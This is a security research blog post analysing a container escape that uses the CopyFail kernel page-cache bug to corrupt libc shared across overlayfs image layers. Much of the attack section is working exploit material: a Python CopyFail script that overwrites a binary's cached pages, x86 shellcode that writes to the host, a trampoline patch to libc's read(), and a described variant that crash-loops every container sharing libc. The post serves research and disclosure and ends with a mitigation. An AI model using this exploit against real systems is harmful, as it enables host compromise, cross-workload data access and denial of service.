---
layout: post
title: Copy2Libc - CopyFail analysis for container escape
date: 2026-05-10
classes: wide
tags:
  - Research
  - Exploitation
--- 
<pre style="font-size: clamp(0.17rem, 0.4vw, 1rem); text-align: center">
 ▄████▄   ▒█████   ██▓███ ▓██   ██▓ ▄█████▄  ██▓     ██▓ ▄▄▄▄    ▄████▄  
▒██▀ ▀█  ▒██▒  ██▒▓██░  ██▒▒██  ██▒      ██▒▓██▒    ▓██▒▓█████▄ ▒██▀ ▀█  
▒▓█    ▄ ▒██░  ██▒▓██░ ██▓▒ ▒██ ██░   ▄███▒ ▒██░    ▒██▒▒██▒ ▄██▒▓█    ▄ 
▒▓▓▄ ▄██▒▒██   ██░▒██▄█▓▒ ▒ ░ ▐██▓░ ▄██▒░   ▒██░    ░██░▒██░█▀  ▒▓▓▄ ▄██▒
▒ ▓███▀ ░░ ████▓▒░▒██▒ ░  ░ ░ ██▒▓░▒████████░██████▒░██░░▓█  ▀█▓▒ ▓███▀ ░
░ ░▒ ▒  ░░ ▒░▒░▒░ ▒▓▒░ ░  ░  ██▒▒▒ ░░░░░░░░░░ ▒░▓  ░░▓  ░▒▓███▀▒░ ░▒ ▒  ░
  ░  ▒     ░ ▒ ▒░ ░▒ ░     ▓██ ░▒░   ░  ░░  ░ ░ ▒  ░ ▒ ░▒░▒   ░   ░  ▒   
░        ░ ░ ░ ▒  ░░       ▒ ▒ ░░  ░          ░ ░    ▒ ░ ░    ░ ░        
░ ░          ░ ░           ░ ░     ░ ░          ░  ░ ░   ░      ░ ░      
░                          ░ ░     ░                          ░ ░
</pre>
<pre style="font-size: 0.6vw; text-align: center">

                               ......................                               
                           ..............................                           
                        ....................................                        
                     ..........................................                     
                   ..............................................                   
                 .......................::::.......................                 
                .................-++************++-.................                
              ................=**********************=:...............              
             ..............-+***************************-..............             
            .............:********************************-.............            
           .............+**********************************+.............           
           ...........:**************************************:...........           
          ...........:+**************##########**************+:...........          
         ............*************################*************............         
         ...........+************##################************+...........         
         ..........:************####################************:...........        
        ...........-***********######################***********=...........        
        ...........=***********######################***********+...........        
        ...........=***********######################***********+...........        
        ...........=***********######################***********=...........        
         ..........:************####################************:...........        
         ...........+************##################************+...........         
         ............*************################*************............         
          ...........:+**************##########***************-...........          
           ...........-**************************************-...........           
           .............+**********************************+.............           
            .............=********************************=.............            
             ..............=****************************=..............             
              ...............:+**********************+:...............              
                .................=+**************+=:................                
                 .....................:::--:::.....................                 
                   ..............................................                   
                     ..........................................                     
                       ......................................                       
                           ..............................                           
                               ......................                               
       
</pre>

# Copy2Libc: CopyFail analysis for container escape

I, like probably most of the cybersec industry, spent the last week around [CopyFail](https://copy.fail/) (and [DirtyFrag](https://github.com/V4bel/dirtyfrag)).

This blog won't cover any of how those exploits work since there is enough public documentation, you can read the [official writeup](https://xint.io/blog/copy-fail-linux-distributions) for CopyFail, [this other analysis](https://retr0.zip/blog/cve-2026-31431-copy-fail.html) that goes a bit deeper into the page cache insides and finally the [official writeup](https://github.com/V4bel/dirtyfrag/blob/master/assets/write-up.md) for DirtyFrag.

TLDR is that we can "corrupt"/modify the page cache page of any file we can `open` (`read` is enough) and that will affect all processes in the system since now, when they want to read the file, the kernel will provide back the cached data we modified. The file in disk is never modified, just the in-memory data. _That's why after a reboot all those changes disappear, basically._

We have 2 variants of the exploit: 

* Those that target an SUID binary (so we can corrupt the ELF with our own shellcode/ELF) so when we execute them, they will run as `root` (if that's the owner of the file) but will run our own code that may just do `setuid(0); system("/bin/bash")`, for example.
* Those that target a file that is used by another application and will give us root. For example, we can corrupt `/etc/passwd` first line, removing the need for a password when login as root. That is, from `root:x:0:0:root:/root:/bin/bash` to `root::0:0:root:/root:/bin/bash` (remove the x)

And obviously we could target any other file or binary in the system to do other things apart from privilege escalation but that's not what I wanted to talk about today.

## CopyFail and containers

When reading the end of [the original CopyFail writeup](https://xint.io/blog/copy-fail-linux-distributions) they mentioned a future blog about containers and the question instantly popped in my mind:

> If I'm on a container, what can I use CopyFail for?

If we are in a container, we can use CopyFail to escalate to root in the container. And once we are in the host, we can use CopyFail to escalate to root in the host. But how to cross the container/namespace boundary?

The obvious way would be if a privilege container is executing a binary we get access to (like bind-mounted) so we can 'CopyFail' it and when the privileged container executes it runs our code.
But that's not a realistic scenario. So how can this be used in a more normal scenario?

## Overlayfs: The illusion of isolation

[This blog](https://retr0.zip/blog/cve-2026-31431-copy-fail.html) already glances at the idea that 3 container may access the same file. And if you are like me, probably one of the first things you did when read about containers is check if a public exploit/concept exists for container escape. And [there is one](https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC) that provides an approach.

Before talking about the exploit itself, let's understand why it works.
For now, let me quote directly from that proof of concept:

>  Container runtimes use overlay filesystems. When two containers share the same image layer, the kernel serves their file reads from the same page-cache pages

> The attacker builds their PoC image FROM the same base image as the target ... Because both containers share the same overlay lower-dir, binaries in the shared layer map to identical page-cache pages.

The idea here is that 2 container images are not necessarily 2 different directories with unique files. Part of their filesystem may point to the same files in disk.

Container layers allow for a way to reuse space and make images more efficient on disk.
Imagine we have 2 images:

> Image 1

```Dockerfile
FROM ubuntu:24.04

RUN apt-get update && apt-get install -y python3

ENTRYPOINT ["/bin/bash"]
```

> Image 2

```Dockerfile
FROM ubuntu:24.04

RUN apt-get update && apt-get install -y vim

ENTRYPOINT ["/bin/bash"]
```

While they will be shown by the container runtime as 2 separate images, it would be a huge waste of space to have the full `ubuntu:24.04` base twice (3 times if you count the actual `ubuntu:24.04` image) on disk.

Instead that layer is shared between the 2 containers:
```bash
$ docker image inspect img1 --format '{{json .RootFS.Layers}}'
["sha256:efafae78d70c98626c521c246827389128e7d7ea442db31bc433934647f0c791",
"sha256:837080d6e19868e2682ddb041a82fe915380baf4ade3c500ce457978036392f1",
"sha256:5f70bf18a086007016e948b04aed3b82103a36bea41755b6cddfaf10ace3c6ef"]

$ docker image inspect img2 --format '{{json .RootFS.Layers}}'
["sha256:efafae78d70c98626c521c246827389128e7d7ea442db31bc433934647f0c791",
"sha256:56aa98af5adb8c5c53b625f6ee82b85791c59992ab5b2468a2408a9349b9d531",
"sha256:5f70bf18a086007016e948b04aed3b82103a36bea41755b6cddfaf10ace3c6ef"]
```

As you can see, only the layer in between (the `apt-get` line) is different.

And you may think, `but when I modify something in the container, it doesn't change the others` and that's the beauty of the implementation.

Container runtimes (Docker, etc.) use overlayfs, which has two layers:

* lowerdir — the read-only base image layer (your shared FROM layer)
* upperdir — a per-container writable layer, initially empty

`/proc/mounts` shows this information for each container:

```bash
root@litios-desktop:~# cat /proc/mounts | grep overlay
overlay /var/lib/docker/rootfs/overlayfs/e18fda229b3c7fc65fbc9cbd1a0d2a96fd9b1a6a8aded4a430558e15a967f8de overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/183/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/177/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/176/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/184/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/184/work,nouserxattr 0 0
overlay /var/lib/docker/rootfs/overlayfs/89d5c9ad8667600e1685890b3b8e37adc49fc578cfdbc24845d072b2ec1dbad5 overlay rw,relatime,lowerdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/185/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/182/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/181/fs:/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/1/fs,upperdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/186/fs,workdir=/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/186/work,nouserxattr 0 0
```

When you read a file, you're reading straight from the lowerdir. Both containers see the same inode because they're literally pointing at the same file on the host.

When you write to file through in one container, overlayfs performs a copy-up:

1. The entire file is copied from lowerdir into that container's upperdir
2. The write is applied to the upperdir copy
3. The upperdir copy shadows the lowerdir original

In the meantime, everything else is reused, and the `inode` number confirms it:

```bash
# img1
root@e18fda229b3c:/home/ubuntu# ls -li /etc/passwd
10884264 -rw-r--r-- 1 root root 888 Feb 10 14:12 /etc/passwd
root@e18fda229b3c:/home/ubuntu# ls -li /etc/shadow
10884296 -rw-r----- 1 root shadow 502 Feb 10 14:12 /etc/shadow

# img2
root@89d5c9ad8667:/home/ubuntu# ls -li /etc/passwd
10884264 -rw-r--r-- 1 root root 888 Feb 10 14:12 /etc/passwd
root@89d5c9ad8667:/home/ubuntu# ls -li /etc/shadow
10884296 -rw-r----- 1 root shadow 502 Feb 10 14:12 /etc/shadow
```

If we modify the file in one container, that one gets its own file (from inside the container, you don't see the change in inode number)

```bash
# img1
root@e18fda229b3c:/home/ubuntu# echo "AAAA" >> /etc/passwd
root@e18fda229b3c:/home/ubuntu# cat /etc/passwd | tail -n 1
AAAA

# upperdir of img1 
root@litios-desktop:~# ls -li /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/184/fs/etc/passwd 
14290632 -rw-r--r-- 1 root root 893 May  9 15:47 /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/184/fs/etc/passwd
root@litios-desktop:~# cat /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/184/fs/etc/passwd | tail -n 1
AAAA

# upperdir of img2 doesn't contain /etc/passwd because it wasn't modified
root@litios-desktop:~# ls -la /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/186/fs/etc/passwd
ls: cannot access '/var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/186/fs/etc/passwd': No such file or directory
```


## Existing exploit

Like I mentioned before, [there is a proof of concept](https://github.com/Percivalll/Copy-Fail-CVE-2026-31431-Kubernetes-PoC) already around this concept for CopyFail. 

Since a daemonset will run in every host (_important since we cannot influence containers in a different machine_) and it will be privileged, if we can build and/or run an image that shares a layer with the daemonset container that has one of the binaries that the daemonset will execute, we can `open` that file in our container, `copyfail` over it so it's page-cache page is corrupted and then the daemonset container will run our code (since they all point to the `lowerdir` file)

The concept here is very simple really, we can test it with our own 2 container images from before:

```bash
# Img1 container
root@e18fda229b3c:/home/ubuntu# ls -li /etc/shadow
10884296 -rw-r----- 1 root shadow 502 Feb 10 14:12 /etc/shadow
root@e18fda229b3c:/home/ubuntu# cat /etc/shadow | head -n 1
root:*:20494:0:99999:7:::
root@e18fda229b3c:/home/ubuntu# vim xpl.py
root@e18fda229b3c:/home/ubuntu# python3 xpl.py 
root@e18fda229b3c:/home/ubuntu# cat /etc/shadow | head -n 1
oops this is from another containero0494:0:99999:7:::

# Img2 container
root@89d5c9ad8667:/home/ubuntu# ls -li /etc/shadow
10884296 -rw-r----- 1 root shadow 502 Feb 10 14:12 /etc/shadow
root@89d5c9ad8667:/home/ubuntu# cat /etc/shadow | head -n 1
root:*:20494:0:99999:7:::
# After running copyfail in the other container
root@89d5c9ad8667:/home/ubuntu# cat /etc/shadow | head -n 1
oops this is from another containero0494:0:99999:7:::
```

That's great, but let's assume the more common scenario where an attacker compromises a container running an application facing a customer, let's say `nginx`, how likely is that they will be able to do anything?

Well, it will depend on your specific kubernetes environment. As we established, the attacker needs to:

* Share a container layer with a privilege container.
* That layer must contain a binary.
* That binary must be executed periodically by the privileged container.

Is there another way?

## Back to the core: libc for the win

Now the binary approach is great, but there is another way. Almost all applications on the container, unless statically linked, will use `libc` for all basic operations.

`libc` will most likely come from the base layer that provides most of the rootfs, that usually is the distro-based image (`ubuntu`, `debian`, `alpine`, etc). This means that even in images with 1000 layers that may change almost everything in the container image, `libc` is still probably coming from the base image.

It makes it a specially great target because:
* It's always readable.
* It will be shared across multiple container images.
* It's most likely never going to be modified, meaning is always pointing to the `lowerdir` file.
* It will always execute, something will run it.

This is where things get tricky. Changing libc (or any running binary) will basically change the memory instructions of any running process too, the mapped `libc` running in the process. Replacing the whole libc binary will most likely corrupt the process, crash the container and reboot.

It is not necessarily bad because, Kubernetes will restart the container and by the time it starts again, it will pick our "corrupted" libc and execute our code on startup (_you can also technically target any running process binary, but then that binary is probably not accessible from your attacker container_).

For demo purposes, let's see this idea first with a simpler scenario. Let's reuse the `img1` `img2` containers from before and target `tail`. This will just override the whole `tail` binary with `A`s. `img2` container will be running it and this write will basically corrupt the process.

```python
#!/usr/bin/env python3
# Altered from the official CopyFail exploit
import os as g,zlib,socket as s
def d(x):return bytes.fromhex(x)
def c(f,t,c, offset=0):
 a=s.socket(38,5,0);
 a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));
 h=279;
 v=a.setsockopt;
 v(h,1,d('0800010000000010'+'0'*64));
 v(h,5,None,4);
 u,_=a.accept();
 o=t+4;i=d('00');
 u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);
 r,w=g.pipe();
 n=g.splice;
 n(f,w,o,offset_src=offset);
 n(r,u.fileno(),o)
 try:u.recv(8+t)
 except:0
 a.close()
 g.close(r)
 g.close(w)

target_file = "/usr/bin/tail"
f=g.open(target_file,0);i=0;
totalsize = g.path.getsize(target_file)
print(f'{target_file} => size to override:', totalsize)
data = b'A' * totalsize
for index in range(0, totalsize, 4096):
    e = data[index:index+4096]
    print(f'Sending {len(e)} bytes to {target_file} -- offset 0x{index:02x}')
    i = 0
    while i<len(e):c(f,i,e[i:i+4], offset=(index));i+=4
```

```bash
# Img 1 container
root@e18fda229b3c:/home/ubuntu# python3 xpl.py
/usr/bin/tail => size to override: 64032
Sending 4096 bytes to /usr/bin/tail -- offset 0x00
Sending 4096 bytes to /usr/bin/tail -- offset 0x1000
Sending 4096 bytes to /usr/bin/tail -- offset 0x2000
Sending 4096 bytes to /usr/bin/tail -- offset 0x3000
Sending 4096 bytes to /usr/bin/tail -- offset 0x4000
Sending 4096 bytes to /usr/bin/tail -- offset 0x5000
Sending 4096 bytes to /usr/bin/tail -- offset 0x6000
Sending 4096 bytes to /usr/bin/tail -- offset 0x7000
Sending 4096 bytes to /usr/bin/tail -- offset 0x8000
Sending 4096 bytes to /usr/bin/tail -- offset 0x9000
Sending 4096 bytes to /usr/bin/tail -- offset 0xa000
Sending 4096 bytes to /usr/bin/tail -- offset 0xb000
Sending 4096 bytes to /usr/bin/tail -- offset 0xc000
Sending 4096 bytes to /usr/bin/tail -- offset 0xd000
Sending 4096 bytes to /usr/bin/tail -- offset 0xe000
Sending 2592 bytes to /usr/bin/tail -- offset 0xf000


# Img 2 container
root@89d5c9ad8667:/home/ubuntu# tail -f /etc/passwd
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash

## img1 executed attack
Segmentation fault (core dumped)
```

As you can see, we basically corrupted the process since it probably tried to execute from an area that all it had now was `A`s. 

Going back to `libc`, for a real attack we have 2 options:
1. Get the `libc` binary, patch it with our shellcode in a specific function and only overwrite that part of the file (cache page). Requires carefully crafted modifications, version dependent.
2. Place our code at `libc` bootstrap and corrupt the rest of the size of `libc` so the process crashes and once the container restarts, it executes our payload on startup.

I will go over `1` because it's more fun (but I will also provide the approach for 2 to show that it works too)

## LIBC-based attack

> I will use a minikube environment for the demo
>
> Full code in: https://github.com/litios/xpls/tree/main/copyfail-containers

Let's build 2 sample images:

```Dockerfile
# Target privileged container
FROM ubuntu:24.04

RUN apt-get update && apt-get install -y python3

COPY test.py /
ENTRYPOINT ["python3", "-u", "test.py"]
```

Where `test.py` is just a test script that does something:

```python
import time

FILE = "/var/log/dpkg.log"

while True:
    with open(FILE, "r") as f:
        contents = f.read()
    print(f"Length: {len(contents)}")
    time.sleep(5)
```

```Dockerfile
# Attacker container
FROM ubuntu:24.04

WORKDIR /home/ubuntu

RUN apt-get update && apt-get install -y vim python3 python3-pip python3-venv
RUN python3 -m venv venv
RUN /home/ubuntu/venv/bin/python3 -m pip install pwntools lief

COPY copyfail-libc.py /home/ubuntu/
ENTRYPOINT ["python3", "-m", "http.server"]
```

> The copyfail-libc.py is available with the rest of the sources in the repo as well as the YAML for deploying them.

For our approach, the idea is as follows:
1. Place our code somewhere in libc that we feel confident with overwriting and not breaking something.
2. Build a small trampoline in a function we know the target will execute.

I will not spend too much time talking about the shellcode we are introducing because it could be anything, for demo purposes, it will open `/host/pwned` and write the hostname (of the container) in it. It saves the `rax` from `read` and returns it at the end so everything looks good and nothing breaks:

```assembly
    push rax
    sub rsp, 390

    mov rax, 63          
    mov rdi, rsp         
    syscall

    lea r9, [rsp + 65]   

    mov rcx, r9
1:
    cmp byte ptr [rcx], 0
    je 2f
    inc rcx
    jmp 1b
2:
    sub rcx, r9          
    mov r8, rcx        

    mov rax, 2
    lea rdi, [rip + filename]
    mov rsi, 0x41        
    mov rdx, 0x1a4       
    syscall

    mov r10, rax         

    mov rdi, r10
    mov rax, 1           
    mov rsi, r9          
    mov rdx, r8          
    syscall

    mov rdi, r10
    mov rax, 3           
    syscall

    add rsp, 390

    pop rax
    ret

filename:
    .ascii "/host/pwned\0"
```

For the place to write our shellcode, I chose `svcraw_getargs` because, in my python3 example, it's a function that is never going to be executed. Depending on your target, this may need to be tweaked. The function is not exported so I used gdb to find the address and hardcoded it (for ubuntu 24.04 image):

```python
func_va = 0x000000000016e220 # because symbol.value is undeclared
```

The function I chose to insert the trampoline into is `read` because our target script reads from a file (and because it's a good target in general). Very simple shellcode, replaces the `ret` for a `jmp` (we need to do some math there to account for PIE/ASLR):

```python
shellcode_corrupt = asm(f"""
    lea rdi, [rip]
    add rdi, 0x{func_va - symbol_corrupt.value - 0x20:02x}
    jmp rdi
""")
```

We will use `lief` to manipulate the ELF and `pwntools` to compile the assembly in the script (there are other ways to do this, like doing it manually, but this works since it's all in one script).

So we will:
* Load the actual libc.so.6 from the system.
* Get `svcraw_getargs` and `read` offsets so we know where to write.
* Add our specific code into `svcraw_getargs`.
* Add a trampoline in `read` so it executes our code that we wrote into `svcraw_getargs`
* Use CopyFail technique to write our shellcode in the specific offsets into the system `libc.so.6`.

> I actually added a couple more steps so I could create a local copy of libc called `libc-patched.so.6` so I could independently:
> * Create the libc patched version.
> * Use CopyFail to replace from any patched libc file.
>
> This is not necessary and you can just do the steps above, but it helped with understanding and working on it so I decided to leave it. This is for demo purposes after all :)

And that's it! The attacker executes the script, corrupts the `libc.so.6` page cache pages (that the target also shares) so when the target container does the next `read`, it executes our code.

<video src="/./assets/videos/copyfail-container-libc.webm" autoplay muted controls></video>

### Bonus: kamikaze libc approach

Like I mentioned, there is another way of doing this. We can just write our code in a function that `libc` executes on start (like `__libc_start_main`) and corrupt the rest of libc so the container crashes when it tries to run any other function and, on reboot, executes our code.

This obviously has the side effect or making all containers running this `libc.so.6` unable to do anything, crashing in a forever loop. Prepare to reboot if you plan to do this!

> Script available as copyfail-libc-libc-start.py

<video src="/./assets/videos/copyfail-containers-libc-kamikaze.webm" autoplay muted controls></video>

## Final notes

The proof of concept here shows how an attacker could use CopyFail in container environments. While the target was a privileged container and container escape, the overall impact is that every container image that shares the same bottom layer (`FROM`) will be affected by the attack, which could be especially harmful for accessing information from other workloads.

Realistically, the chances of an attacker having access to a container which base is the exact same as another privileged container is probably low, but not zero. If the attacker can select the image to load, then the attack becomes much easier, but still there is no way to figure out what other container images are being run (especially, what versions). If the attacker could craft the image then the attack becomes trivial, as explained in the public exploit available.

In general, the obvious impact is the cross-container vector since that, at least, allows us access to all other containers running the same image, and others with the same base.

If you haven't, go patch your servers! And thanks for reading.

`echo 'install algif_aead /bin/false' > /etc/modprobe.d/disable-algif_aead.conf`